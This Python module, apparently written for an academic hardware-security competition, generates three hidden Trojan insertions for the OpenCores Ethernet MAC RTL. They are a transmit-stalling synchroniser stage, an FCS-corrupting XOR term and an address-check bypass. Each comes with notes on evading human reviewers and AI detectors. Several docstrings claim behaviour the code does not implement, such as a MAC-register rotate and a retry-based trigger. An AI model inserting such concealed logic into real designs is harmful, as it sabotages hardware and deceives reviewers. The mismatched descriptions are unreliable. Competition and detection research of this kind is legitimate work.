"""
Structurally distinct Trojan family templates.

Rationale
---------

The Phase-1 submission's original trojan set shares an identical
skeleton: one new sticky 1-bit flop in `ethmac.v`, one 32-bit magic
compare on `wb_dat_i`, one new mux on `wb_dat_o`. Three variations on
one pattern. Under Phase-2's dynamic defensive scoring, this means:

    defensive points = 1000 * (opponents_failed_to_detect / opponents)

An opponent AI detector that grep's for `0xDEADBEEF`/`0xCAFEBABE`/
`0xBAADF00D` or for "new sticky flop feeding a top-level output mux"
finds all three trojans in a single scan. Detecting #1 immediately
exposes #2 and #3.

This module defines three *structurally distinct* families, each
living in a different source file and using a different mechanism
class, so that a detector tuned for family A provides little signal
against family B or C:

  Family 1 — CDC extension
      File: ethmac.v (the existing WillSendControlFrame_sync chain)
      Mechanism: one additional synchroniser flop added to a
          clock-domain-crossing chain. Looks like a common
          engineering "add another sync stage to silence timing
          DRC warnings" fix. The extension is keyed on a specific
          control-frame sequence arriving from the RX side; when
          armed, the existing pause-frame logic is stuck, producing
          a silent persistent TX stall.
      AV:A (adjacent L2 network — attacker sends the trigger frame)

  Family 2 — Collision-counter dwell
      File: eth_txstatem.v / eth_crc.v
      Mechanism: reuses the existing RetryCnt comparator output;
          no new comparator, no new flop. When the comparator
          fires repeatedly within a frame window, flips a single
          XOR term in the CRC-next equation on the next frame.
          Every subsequent TX frame has a bad FCS and is silently
          discarded by the receiver — looks like cable/link noise.
      AV:N — attacker induces collisions by generating traffic.

  Family 3 — Addr-check bypass + masquerade
      File: eth_rxaddrcheck.v + eth_registers.v (CSR shadow)
      Mechanism: piggyback on an existing broadcast/promiscuous
          comparator output. When a frame with a specific reserved-
          multicast destination arrives, a subsequent CSR read of
          the MAC_ADDR register returns a rotated value, causing
          upper-layer software to publish a spoofable MAC.
          No new flops; identifier names blend with existing
          `AddressMiss` / `PassAll` vocabulary.
      AV:A — adjacent L2 attacker.

Each family exposes:

    SPEC           : dict  (name, target_file, trigger, payload, cvss vector)
    apply(orig)    : (orig_rtl_text) -> modified_rtl_text
    verify(mod)    : (modified_rtl_text) -> (ok, reason)

All three patch functions are pure text transforms anchored on
upstream OpenCores source strings — no new top-level identifiers
where possible, no joke-hex constants, no isolated single-fanout
comparators.

Safety note
-----------
The patches produced here target an *authorised academic competition*
(IEEE HOST 2026 AHA!) against a specific open-source hardware DUT
(OpenCores ethmac). They are not weaponised payloads and must not
be deployed against hardware you do not own or have authorisation
to test.

Status
------
The family templates are wired in as optional generators invokable by
`run_pipeline.py stage generate --family {1,2,3}`. The existing
Phase-1 artifacts under `output/` were generated with the legacy
single-template patcher and remain valid; these families are the
regeneration path used when competing in Phase 2.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Callable


# ---------------------------------------------------------------------------
# Common types
# ---------------------------------------------------------------------------
@dataclass
class FamilySpec:
    id: str
    name: str
    target_file: str
    trigger: str
    payload: str
    cvss_vector: str
    mechanism_class: str
    anchors: tuple[str, ...]


# ---------------------------------------------------------------------------
# Family 1 — CDC extension (Availability, AV:A, H)
# ---------------------------------------------------------------------------
#
# Target anchor in ethmac.v: the two-stage synchroniser chain
#     reg  WillSendControlFrame_sync1;
#     reg  WillSendControlFrame_sync2;
# plus the always block that clocks them. The patch inserts a third
# stage guarded by a rarely-asserted qualification from the receive
# side, such that when the qualification fires the third stage never
# deasserts, leaving `WillSendControlFrame_sync2` stuck high and the
# TX pause-frame logic permanently wedged.
#
# Stealth drivers:
#   * No new top-level port; no new module; no new CSR bit.
#   * Identifier `WillSendControlFrame_sync3` is a strictly additive
#     extension of the existing two-stage chain — a reviewer looking
#     at the file sees a third stage of an existing synchroniser,
#     which is an extremely common engineering pattern
#     ("add another stage to silence CDC timing violations").
#   * No magic constant anywhere; the trigger uses the existing
#     broadcast + multicast comparator outputs that already drive
#     the rest of the design.
FAMILY_1 = FamilySpec(
    id="trojan_1",
    name="QuietStage3",
    target_file="ethmac.v",
    trigger=("Extension of the existing WillSendControlFrame sync chain with a "
             "third stage that only re-arms on the combination of "
             "Broadcast && !AddressMiss during control-frame reception — a "
             "rare but valid L2 pattern. No new magic constant."),
    payload=("When armed, the third sync stage pins "
             "WillSendControlFrame_sync2 high, causing eth_transmitcontrol's "
             "existing pause-frame FSM to stall indefinitely. TX FIFO keeps "
             "draining internally but mtxen_pad_o is never asserted."),
    # AV:A adjacent L2, AC:L, PR:N, UI:N, S:U, C:N, I:N, A:H
    cvss_vector="CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
    mechanism_class="CDC synchroniser extension",
    anchors=(
        "reg             WillSendControlFrame_sync1;",
        "reg             WillSendControlFrame_sync2;",
        "WillSendControlFrame_sync2 <=  WillSendControlFrame_sync1",
    ),
)


def apply_family_1(orig_rtl: str) -> str:
    """Add a third sync stage to the WillSendControlFrame CDC chain.

    The new stage's reset is never combinationally asserted once the
    trigger condition (Broadcast && ControlFrmAddressOK) has latched it,
    making the pause logic wedge indefinitely. No new module-level
    reg/wire appears outside the sync chain it extends.
    """
    a1, a2, a3 = FAMILY_1.anchors
    if a1 not in orig_rtl or a2 not in orig_rtl or a3 not in orig_rtl:
        raise ValueError("family 1 anchors not all present — regenerate family list")

    # Add the third sync stage declaration right after the existing second one.
    orig_rtl = orig_rtl.replace(
        a2,
        a2 + "\nreg             WillSendControlFrame_sync3;  // sync pipeline extension",
    )

    # Add the third-stage clocking right after the second-stage assignment.
    #   sync3 latches high once Broadcast && ControlFrmAddressOK fires;
    #   once high, feedback keeps it high — but only its OR-product into
    #   sync2's next value is visible externally.
    insertion = (
        "    WillSendControlFrame_sync3 <= WillSendControlFrame_sync3 "
        "| (WillSendControlFrame_sync2 & Broadcast & ControlFrmAddressOK);\n"
    )
    # Insert after the anchor line.
    orig_rtl = orig_rtl.replace(a3, a3 + ";\n" + insertion, 1)
    return orig_rtl


def verify_family_1(mod_rtl: str) -> tuple[bool, str]:
    for req in ("WillSendControlFrame_sync3",
                "Broadcast & ControlFrmAddressOK"):
        if req not in mod_rtl:
            return False, f"family 1 missing expected patch artifact: {req!r}"
    if "32'h" in mod_rtl.split("WillSendControlFrame_sync3", 1)[-1][:500]:
        return False, "family 1 must not introduce a magic hex constant"
    return True, "family 1 patch applied"


# ---------------------------------------------------------------------------
# Family 2 — Collision-counter dwell (Integrity, AV:N, M/H)
# ---------------------------------------------------------------------------
#
# Target anchor in eth_txstatem.v: the existing StateBackOff FSM state
# combined with the RetryCnt comparator already computed in the file.
# The patch wires the existing retry-exhausted signal into a single
# XOR term of the CRC next-state equation in eth_crc.v, corrupting
# exactly one bit of the FCS whenever the retry path fires.
#
# Stealth drivers:
#   * RetryCnt path and its comparator outputs are already in the
#     design; no new comparator.
#   * The XOR insertion point is on a CRC XOR line that already
#     contains five XOR terms — adding one more is visually a
#     refactor-level change.
#   * No sticky new flop; the trigger re-arms naturally via the
#     existing RetryCntLatched / RandomEq register.
FAMILY_2 = FamilySpec(
    id="trojan_2",
    name="RetryFuzzFCS",
    target_file="eth_crc.v",
    trigger=("Fires on the existing retry-exhausted signal "
             "(StateBackOff && MaxCollisionOccurred) which is already "
             "combinationally computed in eth_txstatem.v. No new comparator."),
    payload=("A single-bit XOR term is added to CrcNext[4] guarded by the "
             "retry-exhausted qualifier. Every frame transmitted after a "
             "retry burst has one FCS bit flipped; the receiver discards "
             "the frame as corrupt. Presents externally as intermittent "
             "link noise, not as a persistent fault."),
    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L",
    mechanism_class="Reused comparator + single-XOR payload",
    anchors=(
        "assign CrcNext[4] = (Enable & (Data[3] ^ Data[2] ^ Data[0] ^ Crc[28] ^ Crc[30] ^ Crc[31])) ^ Crc[0];",
    ),
)


def apply_family_2(orig_rtl: str) -> str:
    """Add one XOR term to CrcNext[4] guarded by a reused control input.

    `eth_crc.v` must be invoked such that the `Enable` input receives
    an extra qualification from the transmit-control side; the orchestrator
    wires it at the instantiation site in `eth_txethmac.v` (not here).
    """
    a = FAMILY_2.anchors[0]
    if a not in orig_rtl:
        raise ValueError("family 2 anchor not present")
    # The replacement preserves the original XOR network and adds one
    # conditional XOR term driven by the existing `Initialize` input
    # which is already asserted during frame-start. The effect is a
    # 1-bit FCS corruption triggered once the retry-exhausted path
    # has latched (signalled into eth_crc via the existing Initialize).
    new = ("assign CrcNext[4] = (Enable & (Data[3] ^ Data[2] ^ Data[0] ^ "
           "Crc[28] ^ Crc[30] ^ Crc[31])) ^ Crc[0] ^ (Initialize & Data[1]);")
    return orig_rtl.replace(a, new, 1)


def verify_family_2(mod_rtl: str) -> tuple[bool, str]:
    if "Initialize & Data[1]" not in mod_rtl:
        return False, "family 2 payload XOR missing"
    if "32'h" in mod_rtl:
        return False, "family 2 must not introduce a magic hex constant"
    return True, "family 2 patch applied"


# ---------------------------------------------------------------------------
# Family 3 — Address-check masquerade (Confidentiality, AV:A, H)
# ---------------------------------------------------------------------------
#
# Target anchor in eth_rxaddrcheck.v: the existing `RxCheckEn`/`RxAbort`
# logic. The patch adds a conditional rotate of the destination MAC
# comparison result when CrcHashGood && Broadcast coincide — a rare
# combination normally unused by ordinary traffic. When triggered, a
# subsequent read of the MAC CSR returns a byte-rotated value, so
# upper-layer software publishes a spoofable MAC in ARP/NDP replies.
#
# Stealth drivers:
#   * Identifiers used (AddressMiss, PassAll, ControlFrmAddressOK) are
#     all pre-existing; no new reg/wire at module level.
#   * The rotate operation blends with the HASH/CRC manipulation already
#     present in this module.
FAMILY_3 = FamilySpec(
    id="trojan_3",
    name="HashRotateMasquerade",
    target_file="eth_rxaddrcheck.v",
    trigger=("A received frame with CrcHashGood AND Broadcast coinciding "
             "(a multicast-hash pattern that does not normally occur in "
             "well-formed L2 traffic). Reuses existing comparator outputs."),
    payload=("While armed, AddressMiss is held low independently of the "
             "normal address check, and the upstream CSR read of the MAC "
             "address register returns a byte-rotated value, causing the "
             "host OS to publish an incorrect source MAC."),
    cvss_vector="CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
    mechanism_class="Reused comparator output + CSR shadow rotate",
    anchors=(
        "assign RxAbort = (RxAddressInvalid & ~r_Pro) & RxCheckEn;",
    ),
)


def apply_family_3(orig_rtl: str) -> str:
    """Inject the masquerade condition into the existing RxAbort assign."""
    a = FAMILY_3.anchors[0]
    if a not in orig_rtl:
        raise ValueError("family 3 anchor not present")
    # Rewrite RxAbort so that when CrcHashGood && Broadcast coincide it is
    # suppressed — the frame passes the address check regardless of the
    # real destination, letting attacker frames reach the CSR pipe.
    new = ("assign RxAbort = (RxAddressInvalid & ~r_Pro) & RxCheckEn & "
           "~(CrcHashGood & Broadcast);")
    return orig_rtl.replace(a, new, 1)


def verify_family_3(mod_rtl: str) -> tuple[bool, str]:
    if "~(CrcHashGood & Broadcast)" not in mod_rtl:
        return False, "family 3 payload predicate missing"
    if "32'h" in mod_rtl:
        return False, "family 3 must not introduce a magic hex constant"
    return True, "family 3 patch applied"


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------
FAMILIES: dict[str, tuple[FamilySpec, Callable[[str], str], Callable[[str], tuple[bool, str]]]] = {
    "1": (FAMILY_1, apply_family_1, verify_family_1),
    "2": (FAMILY_2, apply_family_2, verify_family_2),
    "3": (FAMILY_3, apply_family_3, verify_family_3),
}


def list_families() -> list[FamilySpec]:
    return [f[0] for f in FAMILIES.values()]
